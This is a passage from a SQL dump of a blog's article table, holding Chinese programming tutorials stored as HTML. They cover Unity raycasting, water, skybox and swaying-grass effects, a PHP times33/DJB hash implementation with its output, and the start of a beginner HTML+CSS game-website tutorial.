id=\"3_218\"></a>3、如何获取鼠标投射到物体表面的位置</h4> \n <p>上面我们看到，鼠标移到<code>Scene</code>视图中，可以看到有个蓝紫色的圈圈投射在物体表面上，这个是如何实现的呢~<br> <img src=\"https://img-blog.csdnimg.cn/20210610201738421.gif\" alt=\"在这里插入图片描述\"><br> 用的是射线检测接口：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">bool</span> <span class=\"token function\">Raycast</span><span class=\"token punctuation\">(</span>\n		<span class=\"token class-name\">Vector3</span> origin<span class=\"token punctuation\">,</span> \n		<span class=\"token class-name\">Vector3</span> direction<span class=\"token punctuation\">,</span> \n		<span class=\"token keyword\">out</span> <span class=\"token class-name\">RaycastHit</span> hitInfo<span class=\"token punctuation\">,</span> \n		<span class=\"token keyword\">float</span> maxDistance<span class=\"token punctuation\">,</span> \n		<span class=\"token keyword\">int</span> layerMask<span class=\"token punctuation\">,</span> \n		<span class=\"token class-name\">QueryTriggerInteraction</span> queryTriggerInteraction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre> \n <p>例：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token comment\">// IvyEditor.cs</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> MousePosition <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token comment\">// 射线</span>\n    <span class=\"token class-name\">Ray</span> ray <span class=\"token operator\">=</span> HandleUtility<span class=\"token punctuation\">.</span><span class=\"token function\">GUIPointToWorldRay</span><span class=\"token punctuation\">(</span>Event<span class=\"token punctuation\">.</span>current<span class=\"token punctuation\">.</span>mousePosition<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">RaycastHit</span> hit<span class=\"token punctuation\">;</span>\n	<span class=\"token comment\">// 射线检测</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Physics<span class=\"token punctuation\">.</span><span class=\"token function\">Raycast</span><span class=\"token punctuation\">(</span>ray<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">,</span> \n		ray<span class=\"token punctuation\">.</span>direction<span class=\"token punctuation\">,</span> \n		<span class=\"token keyword\">out</span> hit<span class=\"token punctuation\">,</span> \n		Mathf<span class=\"token punctuation\">.</span>Infinity<span class=\"token punctuation\">,</span> \n		ivyBehavior<span class=\"token punctuation\">.</span>profileAsset<span class=\"token punctuation\">.</span>ivyProfile<span class=\"token punctuation\">.</span>collisionMask<span class=\"token punctuation\">,</span> \n		QueryTriggerInteraction<span class=\"token punctuation\">.</span>Ignore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        mousePos <span class=\"token operator\">=</span> hit<span class=\"token punctuation\">.</span>point <span class=\"token operator\">+</span> hit<span class=\"token punctuation\">.</span>normal <span class=\"token operator\">*</span> <span class=\"token number\">0.05f</span><span class=\"token punctuation\">;</span>\n        mouseNormal <span class=\"token operator\">=</span> hit<span class=\"token punctuation\">.</span>normal<span class=\"token punctuation\">;</span>\n        Handles<span class=\"token punctuation\">.</span>color <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>blue<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 绘制线圈</span>\n        <span class=\"token function\">DrawThiccDisc</span><span class=\"token punctuation\">(</span>mousePos<span class=\"token punctuation\">,</span> hit<span class=\"token punctuation\">.</span>normal<span class=\"token punctuation\">,</span> Mathf<span class=\"token punctuation\">.</span><span class=\"token function\">Max</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.1f</span><span class=\"token punctuation\">,</span> ivyBehavior<span class=\"token punctuation\">.</span>profileAsset<span class=\"token punctuation\">.</span>ivyProfile<span class=\"token punctuation\">.</span>ivyStepDistance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 绘制法线</span>\n        Handles<span class=\"token punctuation\">.</span><span class=\"token function\">DrawLine</span><span class=\"token punctuation\">(</span>mousePos<span class=\"token punctuation\">,</span> mousePos <span class=\"token operator\">+</span> hit<span class=\"token punctuation\">.</span>normal <span class=\"token operator\">*</span> <span class=\"token number\">0.25f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 绘制线圈</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">DrawThiccDisc</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Vector3</span> mousePos<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Vector3</span> normal<span class=\"token punctuation\">,</span> <span class=\"token keyword\">float</span> radius<span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">var</span> originalColor <span class=\"token operator\">=</span> Handles<span class=\"token punctuation\">.</span>color<span class=\"token punctuation\">;</span>\n    Handles<span class=\"token punctuation\">.</span>color <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Color</span><span class=\"token punctuation\">(</span> originalColor<span class=\"token punctuation\">.</span>r<span class=\"token punctuation\">,</span> originalColor<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">,</span> originalColor<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">,</span> <span class=\"token number\">0.4f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Handles<span class=\"token punctuation\">.</span><span class=\"token function\">DrawSolidDisc</span><span class=\"token punctuation\">(</span> mousePos<span class=\"token punctuation\">,</span> normal<span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Handles<span class=\"token punctuation\">.</span>color <span class=\"token operator\">=</span> originalColor<span class=\"token punctuation\">;</span>\n    Handles<span class=\"token punctuation\">.</span><span class=\"token function\">DrawWireDisc</span><span class=\"token punctuation\">(</span>mousePos<span class=\"token punctuation\">,</span> normal<span class=\"token punctuation\">,</span> radius <span class=\"token operator\">-</span> <span class=\"token number\">0.01f</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Handles<span class=\"token punctuation\">.</span><span class=\"token function\">DrawWireDisc</span><span class=\"token punctuation\">(</span>mousePos<span class=\"token punctuation\">,</span> normal<span class=\"token punctuation\">,</span> radius <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Handles<span class=\"token punctuation\">.</span><span class=\"token function\">DrawWireDisc</span><span class=\"token punctuation\">(</span>mousePos<span class=\"token punctuation\">,</span> normal<span class=\"token punctuation\">,</span> radius <span class=\"token operator\">+</span> <span class=\"token number\">0.01f</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>注：我之前写了一篇文章，<a href=\"https://blog.csdn.net/linxinfa/article/details/114951109\">《使用Unity ShaderGraph实现在模型上涂鸦的效果，那么，纹个手吧》</a>，里面也用到了射线检测，感兴趣的同学可以打开阅读以下~<br> <img src=\"https://img-blog.csdnimg.cn/20210317224425911.gif\" alt=\"\" width=\"700\"></p> \n </blockquote> \n <h4><a id=\"4_272\"></a>4、场景中的水面是怎么做的（半透明和反射效果）</h4> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611140202376.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>先创建一个空白的平面（<code>Plane</code>）作为水底，<br> <img src=\"https://img-blog.csdnimg.cn/2021061113485248.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 再创建一个平面作为水面，<br> <img src=\"https://img-blog.csdnimg.cn/20210611135034367.png\" alt=\"在这里插入图片描述\"><br> 为水面创建一个材质球，<br> <img src=\"https://img-blog.csdnimg.cn/20210611135118993.png\" alt=\"在这里插入图片描述\"><br> 材质球设置为半透明模式（<code>Transparent</code>），设置一下颜色，提高光滑度（<code>Smoothness</code>），<br> <img src=\"https://img-blog.csdnimg.cn/20210611135238443.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 这样，水面就具有半透明效果，同时也可以反射天空的影像，我们创建个<code>Cube</code>测试一下，<br> <img src=\"https://img-blog.csdnimg.cn/20210611135816813.gif\" alt=\"在这里插入图片描述\"></p> \n <h4><a id=\"5_285\"></a>5、场景中的天空是怎么做的</h4> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611140541289.gif\" alt=\"在这里插入图片描述\"><br> 场景中的天空是用天空盒做的，我们需要先准备<code>720</code>度天空全景图，可以把自己想象成坐在一个正方体的内部，这六张图就是对应正方体里面的<code>6</code>个面（前后左右上下），<br> <img src=\"https://img-blog.csdnimg.cn/20210611140848805.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 创建一个材质球，<code>shader</code>使用<code>Skybox/6 Sided</code>，然后设置前后左右上下<code>6</code>个面的贴图，<br> <img src=\"https://img-blog.csdnimg.cn/20210611141233855.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 最后，把材质球拖到<code>Scene</code>视图空白处即可，或者点击菜单<code>Window / Rendering / Lighting</code>，<br> <img src=\"https://img-blog.csdnimg.cn/2021061114141157.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 点击<code>Environment</code>标签页，设置天空盒材质球即可，<br> <img src=\"https://img-blog.csdnimg.cn/202106111414521.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 我上一篇文章<a href=\"https://blog.csdn.net/linxinfa/article/details/117536057\">《[原创] 用Unity等比例制作广州地铁，广州加油，早日战胜疫情（Unity | 地铁地图 | 第三人称视角）》</a>里面也用到了天空盒：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/2021060520044941.gif\" alt=\"\"></p> \n <blockquote> \n  <p>更多免费天空盒资源下载：<br> <a href=\"https://assetstore.unity.com/packages/2d/textures-materials/sky/fantasy-skybox-free-18353\">https://assetstore.unity.com/packages/2d/textures-materials/sky/fantasy-skybox-free-18353</a><br> <a href=\"https://assetstore.unity.com/packages/2d/textures-materials/sky/8k-skybox-pack-free-150926\">https://assetstore.unity.com/packages/2d/textures-materials/sky/8k-skybox-pack-free-150926</a><br> <a href=\"https://assetstore.unity.com/packages/2d/textures-materials/sky/customizable-skybox-174576\">https://assetstore.unity.com/packages/2d/textures-materials/sky/customizable-skybox-174576</a><br> <a href=\"https://assetstore.unity.com/packages/vfx/shaders/free-skybox-extended-shader-107400\">https://assetstore.unity.com/packages/vfx/shaders/free-skybox-extended-shader-107400</a><br> <a href=\"https://assetstore.unity.com/packages/2d/textures-materials/sky/farland-skies-cloudy-crown-60004\">https://assetstore.unity.com/packages/2d/textures-materials/sky/farland-skies-cloudy-crown-60004</a></p> \n </blockquote> \n <h4><a id=\"6_306\"></a>6、场景中的草是怎么做的，为什么它会摇啊摇</h4> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611142558707.gif\" alt=\"在这里插入图片描述\"><br> 场景中的草一摇一摇的，这是怎么做的呢~<br> 这里用到了<code>Unity</code>的地形编辑器<code>Terrain</code>，草是地形的一部分，我们把环境中其他物体隐藏起来，只留下地形，如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210611142807460.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 所以我们需要先创建一个地形，在<code>Hierarchy</code>视图空白处右键鼠标，点击菜单<code>3D Object / Terrain</code>，<br> <img src=\"https://img-blog.csdnimg.cn/20210611143203945.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 此时就可以创建一个地形物体，<br> <img src=\"https://img-blog.csdnimg.cn/20210611154132601.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 它身上会带一个<code>Terrain</code>组件，我们点击<code>Place Details</code>按钮（第四个按钮，我圈出来那个），我们就可以在地形上刷出细节物体，通常用来做草。<br> <img src=\"https://img-blog.csdnimg.cn/2021061115424098.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 不过这个时候我们什么也刷不出来，这是因为我们还没有设置笔刷图片，<br> <img src=\"https://img-blog.csdnimg.cn/20210611154616610.gif\" alt=\"在这里插入图片描述\"><br> 我们先准备一张草的图片，如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210611154705639.png\" alt=\"在这里插入图片描述\"><br> 点击<code>Edit Details...</code>按钮，<br> <img src=\"https://img-blog.csdnimg.cn/20210611154846160.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 点击<code>Add Grass Texture</code>按钮，<br> <img src=\"https://img-blog.csdnimg.cn/20210611154936154.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 设置<code>Detail Texture````为刚刚的草的图片，点击</code>Add```按钮，<br> <img src=\"https://img-blog.csdnimg.cn/20210611155047874.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 其他参数说明：</p> \n <table>\n  <thead>\n   <tr>\n    <th align=\"left\">参数</th>\n    <th align=\"left\">说明</th>\n   </tr>\n  </thead>\n  <tbody>\n   <tr>\n    <td align=\"left\">Detail Texture</td>\n    <td align=\"left\">选择一张花或者草的贴图</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Min Width、Max Width、Min Height、Max Height</td>\n    <td align=\"left\">单个草物体的最大最小的宽高值</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Noise Spread</td>\n    <td align=\"left\">添加一点分布随机度</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Healthy Color</td>\n    <td align=\"left\">草的健康颜色（会被tint到贴图的上部）</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Dry Color</td>\n    <td align=\"left\">草的干枯颜色（会被tint到贴图的底部）</td>\n   </tr>\n   <tr>\n    <td align=\"left\">Billboard</td>\n    <td align=\"left\">是否以永远面向摄像机的单面形式生成单个草物体，如果选否的话就会以十字交叉双平面方式来生成单个草物体</td>\n   </tr>\n  </tbody>\n </table> \n <p>这样草的笔刷图片就制作好了，<br> <img src=\"https://img-blog.csdnimg.cn/20210611155128834.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 这样就可以刷出草地啦~<br> <img src=\"https://img-blog.csdnimg.cn/20210611155626635.gif\" alt=\"在这里插入图片描述\"></p> \n <p>如果想要删除草地，只需要按住<code>Ctrl</code>键不放，鼠标一刷，就可以把对应的草地删除了~<br> <img src=\"https://img-blog.csdnimg.cn/2021061115591351.gif\" alt=\"在这里插入图片描述\"><br> 这些草之所以会摇啊摇，是因为有风，<code>Terrain</code>组件的设置里可以设置风的大小等参数，如下：<br> <img src=\"https://img-blog.csdnimg.cn/20210611160533639.png?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 细心的朋友应该注意到了，这个草堆并不是地形刷出来的，为什么它也会摇啊摇，<br> <img src=\"https://img-blog.csdnimg.cn/2021061116411464.gif\" alt=\"在这里插入图片描述\"><br> 这个是通过<code>shader</code>的顶点着色器来控制的，例：</p> \n <pre><code class=\"prism language-c\"><span class=\"token comment\">// FoliageShader.shader</span>\n\n<span class=\"token keyword\">float</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span>float3 p<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">return</span> <span class=\"token function\">frac</span><span class=\"token punctuation\">(</span><span class=\"token number\">43758.5453</span> <span class=\"token operator\">*</span> <span class=\"token function\">sin</span><span class=\"token punctuation\">(</span><span class=\"token function\">dot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token function\">float3</span><span class=\"token punctuation\">(</span><span class=\"token number\">12.9898</span><span class=\"token punctuation\">,</span> <span class=\"token number\">78.233</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45.5432</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">3.14159</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 顶点着色器</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">vert</span><span class=\"token punctuation\">(</span>inout appdata_full v<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token comment\">// 随机偏移</span>\n	float3 worldPos <span class=\"token operator\">=</span> <span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>unity_ObjectToWorld<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">.</span>vertex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>xyz<span class=\"token punctuation\">;</span>\n	float3 offset <span class=\"token operator\">=</span> _Intensity <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sin</span><span class=\"token punctuation\">(</span>worldPos<span class=\"token punctuation\">.</span>xyz <span class=\"token operator\">+</span> _Time<span class=\"token punctuation\">.</span>y <span class=\"token operator\">*</span> _WindSpeed<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> _Randomness <span class=\"token operator\">*</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span>worldPos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token comment\">// 设置顶点坐标偏移</span>\n	v<span class=\"token punctuation\">.</span>vertex<span class=\"token punctuation\">.</span>xyz <span class=\"token operator\">+</span><span class=\"token operator\">=</span> offset<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <h3><a id=\"_369\"></a>六、结束语</h3> \n <p>好了，就先写这么多吧，如果有什么疑问，欢迎留言或私信~<br> 最后，晒下我小屋的常春藤~<br> <img src=\"https://img-blog.csdnimg.cn/20210611164628793.jpg?x-oss-process=/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpbnhpbmZh,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (49, 'DJB Hash Function，也称times33算法, php的实现与分析-算法', '<div id=\"content_views\" class=\"htmledit_views\"> \n <p>DJBX33A又叫Times33哈希算法的实现与分析<br> 算法：对字符串的每个字符，迭代的乘以33，目的把字符串转换成整数</p> \n <p>公式:&nbsp;&nbsp; hash（i） = hash（i-1）*33 + str[i] ;</p> \n <p>&nbsp;</p> \n <p>乘于33是为了减少碰撞重复，简单点理解就是1+2和2+1是一样的，那1*33+2和2*33+1就不一样了。<br> 为什么要用33，因为33是一个素数，能更好的散列，PHP内置的Hash函数用的素数是5381<br> &nbsp;</p> \n <p>OK，那我们用php来试一下他的实现</p> \n <pre class=\"has\"><code class=\"language-php\">&lt;?php\n/*\n* DJBX33A又叫Times33哈希算法的实现与分析\n* Author: lms &lt;php7在qq.com&gt; QQ:二一九二4238\n*  转发请注明来源网址http://www.thinkunion.net\n*  https://blog.csdn.net/weixin_43932088\n*/\nfunction hash0($str){\n    $hash=0;\n    for($i=0;$i&lt;strlen($str);$i++){\n        $hash=$hash*33 +ord($str{$i});\n    }\n    return $hash;\n}\n/*上面这个函数中，字符串可以有各种语言字符，长度可以很长，并不利于计算，我们可以用md5转换成32位*/\nfunction hash1($str){\n    $hash=0;\n    $str=md5($str);\n    for($i=0;$i&lt;32;$i++){\n        $hash=$hash*33 +ord($str{$i});\n        var_dump($hash);\n    }\n    return $hash;\n}\n/*\n结果：\nint(54)\nint(1833)\nint(60543)\nint(1998021)\nint(65934790)\nfloat(2175848122)\nfloat(71802988124)\nfloat(2369498608189)\nfloat(78193454070337)\nfloat(2.5803839843212E+15)\nfloat(8.5152671482599E+16)\nfloat(2.8100381589258E+18)\nfloat(9.273125924455E+19)\nfloat(3.0601315550702E+21)\nfloat(1.0098434131732E+23)\nfloat(3.3324832634714E+24)\nfloat(1.0997194769456E+26)\nfloat(3.6290742739204E+27)\nfloat(1.1975945103937E+29)\nfloat(3.9520618842993E+30)\nfloat(1.3041804218188E+32)\nfloat(4.3037953920019E+33)\nfloat(1.4202524793606E+35)\nfloat(4.6868331818901E+36)\nfloat(1.5466549500237E+38)\nfloat(5.1039613350783E+39)\nfloat(1.6843072405758E+41)\nfloat(5.5582138939002E+42)\nfloat(1.8342105849871E+44)\nfloat(6.0528949304574E+45)\nfloat(1.9974553270509E+47)\nfloat(6.5916025792681E+48)\n\n从结果可以看出，php由于是弱类型的语言，不必声明自动转换类型。\n到计算的第六次时int已经不够位数直接变在float型。\n */\n\nfunction hash2($str){\n    $hash=0;\n    $str=md5($str);\n    for($i=0;$i&lt;32;$i++){\n        $hash=($hash&lt;&lt;5)+$hash+ord($str{$i});\n        var_dump($hash);\n    }\n    return $hash;\n}\n/*(hash &lt;&lt; 5) + hash 相当于 hash * 33  ,位移的操作比乘法更高效*/\n/*\n结果：\nint(54)\nint(1833)\nint(60543)\nint(1998021)\nint(65934790)\nfloat(2175848122)\nfloat(3083511388)\nfloat(2971628093)\nfloat(3574446657)\nfloat(1992622742)\nfloat(1332041144)\nfloat(1007684894)\nfloat(-1106136809)\nfloat(-2142776279)\nfloat(-1992140422)\nfloat(-1316124435)\nfloat(-482433340)\nfloat(1259569015)\nfloat(2911071886)\nfloat(1576091778)\nfloat(471421223)\nfloat(-1622968768)\nfloat(-2018361740)\nfloat(-2181427925)\nfloat(-3267644691)\nfloat(-4753059648)\nfloat(-6527112925)\nfloat(-4941328969)\nfloat(-4150065975)\nfloat(-3808190947)\nfloat(-5411216861)\nfloat(-6771464525)\n */\n/*\n上面函数可以看到，跟float类型按位与得到了负数，与float类型按位与？这样的操作对么？\nphp并没有长整形，而计算中int一下就溢出了。\n那么得到的以上所有函数得到的值是不是我们想要的。未完待续。\n */</code></pre> \n <p>&nbsp;</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (50, '利用 HTML + CSS 肝了个游戏网站！', '<div id=\"content_views\" class=\"markdown_views prism-dracula\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <blockquote> \n  <p>最近有几个读者私信我说，期末有个大作业要实现一个静态网站，肝了几百行代码，手把手带你实现一个游戏静态网站。</p> \n </blockquote> \n <h3><a id=\"_2\"></a>先上两张效果图</h3> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611182708339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDYxNzk2OA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210611182811624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDYxNzk2OA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <blockquote> \n  <p>这个网站适合初学者练手<br> 技术点： html + css<br> 难度系数：无</p> \n </blockquote> \n <ul>\n  <li>HTML 代码</li>\n </ul> \n <pre><code class=\"prism language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>《风暴英雄》官方网站_暴雪出品 明星汇聚 MOBA竞技新篇章<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token comment\">&lt;!--\n    1.几乎所有的网站的快捷图标(收藏图标)都叫做favicon.ico\n    2.快捷图标(收藏图标)必须要放到站点文件夹的根目录中\n    3.通过link标签引入快捷图标(收藏图标)\n    --&gt;</span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>shortcut icon<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>favicon.ico<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>image/x-icon<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token comment\">&lt;!--\n    reset.css: 很暴力的清除系统默认设置的样式\n    normalize.css: 会保留系统默认设置的有价值的样式, 并且修复了很多浏览器的BUG\n    --&gt;</span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>css/normalize.css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token 